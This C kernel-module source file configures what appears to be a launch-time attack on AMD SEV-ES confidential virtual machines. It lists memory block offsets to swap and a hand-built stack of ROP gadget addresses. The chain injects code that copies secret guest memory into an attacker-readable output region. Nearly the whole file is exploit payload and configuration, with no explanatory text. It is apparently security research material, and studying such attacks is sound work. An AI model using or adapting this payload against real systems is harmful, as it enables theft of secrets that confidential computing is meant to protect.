#include <linux/launch-attack.h>
#include <linux/module.h>

//source blocks for stage 1 gadget 
uint64_t stage1_block_offsets[5] = {0xa5150,0xb51e0,0x145de0,0x1013c0,0x3d42e0};


//stage 2 stack gadget
uint8_t __mal_stack[] = {
    //values for first run of stage two gadget
    0x20, 0x1f, 0xfd, 0xff, 0x00, 0x00, 0x00, 0x00, // 0x00 00 00 00 ff fd 1f 20 addr first rop pop gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // value for rax (dest addr)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // value for rbx (unused)
    0xab, 0xec, 0xfc, 0xff, 0x00, 0x00, 0x00, 0x00, // 0x00 00 00 00 ff fc ec ab addr second rop pop gadget
    0x58, 0x59, 0x48, 0x8B, 0x18, 0x48, 0x89, 0x19,  // value for rdx (value to write) used for injected code
    0xbf, 0xff, 0xfc, 0xff, 0x00, 0x00, 0x00, 0x00,  // 0x00 00 00 00 ff fc ff bf addr mov rop gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // value for rbx (unused)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // value for rbp (unused)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // value for r12 (unused)
    //values for second run of stage two gadget; first value is pop'ed by the ret of the mov gadget
    0x20, 0x1f, 0xfd, 0xff, 0x00, 0x00, 0x00, 0x00, // 0x00 00 00 00 ff fd 1f 20 addr first rop pop gadget
    0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // value for rax (dest addr), note the increase by 0x8
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // value for rbx (unused)
    0xab, 0xec, 0xfc, 0xff, 0x00, 0x00, 0x00, 0x00, // 0x00 00 00 00 ff fc ec ab addr second rop pop gadget
    0xC3, 0xF4, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // value for rdx (value to write); used for injected code
    0xbf, 0xff, 0xfc, 0xff, 0x00, 0x00, 0x00, 0x00,  // 0x00 00 00 00 ff fc ff bf addr mov rop gadget
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // value for rbx (unused)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // value for rbp (unused)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // value for r12 (unused)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  //jump to injected code by ret of mov gadget
    //injected code gadget [0x00,0x07]
    0x00, 0xc0, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,  //value for rax (secret addr) + 0x00
    0x30, 0x91, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, //value for rcx (output addr ) offset in 0x809000 + 0x130
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //jmp to next gadget iteration
    //injected code gadget [0x08,0x0f]
    0x08, 0xc0, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,  //value for rax (secret addr) +0x08
    0x38, 0x91, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, //value for rcx (output addr ) offset in 0x809000 + 0x138
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //jmp to next gadget iteration
     //injected code gadget [0x10,0x17]
    0x10, 0xc0, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,  //value for rax (secret addr) +0x10
    0x40, 0x91, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, //value for rcx (output addr ) offset in 0x809000 + 0x140
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //jmp to next gadget iteration
     //injected code gadget [0x18,0x1f]
    0x18, 0xc0, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,  //value for rax (secret addr) +0x18
    0x48, 0x91, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, //value for rcx (output addr ) offset in 0x809000 + 0x148
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //jmp to next gadget iteration
     //injected code gadget [0x20, 0x27]
    0x20, 0xc0, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,  //value for rax (secret addr) +0x20
    0x50, 0x91, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, //value for rcx (output addr ) offset in 0x809000 + 0x150
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //jmp to next gadget iteration
     //injected code gadget [0x28,0x2f]
    0x28, 0xc0, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00,  //value for rax (secret addr) +0x28
    0x58, 0x91, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, //value for rcx (output addr ) offset in 0x809000 + 0x158
    0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, //jmp to injected hlt 
};

launch_attack_config_t launch_attack_config = {
    .target_block = 0x003D06D0,
    .source_blocks = stage1_block_offsets,
    .source_blocks_len = 5,
    .target_cpuid_call_count = 32, //value for plain: 15, value for sev-es: 32 
    .current_cpuid_call_count = 0,
    .malicious_stack_content = __mal_stack,
    .malicious_stack_content_len = sizeof(__mal_stack)/sizeof(uint8_t),
    .active = true,
};
EXPORT_SYMBOL(launch_attack_config);
